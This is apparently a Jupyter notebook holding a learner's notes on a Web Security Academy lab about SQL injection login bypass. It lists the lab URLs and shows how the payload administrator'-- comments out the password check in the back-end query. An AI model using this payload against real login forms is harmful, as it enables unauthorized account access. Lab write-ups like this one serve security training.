{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection vulnerability allowing login bypass\n",
    "\n",
    "- sqli: login function\n",
    "- end goal: use sqli attack and login as administrator user"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "\n",
    "- URL: `https://0a0e00f304b6997c8134bbb900430058.web-security-academy.net`\n",
    "\n",
    "- go to login page: `https://0a0e00f304b6997c8134bbb900430058.web-security-academy.net/login`\n",
    "\n",
    "- back-end:\n",
    "```sql\n",
    "select firstname from users where username='administrator' and password='anything'\n",
    "\n",
    "select firstname from users where username='administrator'' and password='anything'\n",
    "'-- add single quote follow username is send back 'internal server error'\n",
    "\n",
    "select firstname from users where username='administrator'--' and password='anything'\n",
    "-- database interest only username but don't care password \n",
    "```"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
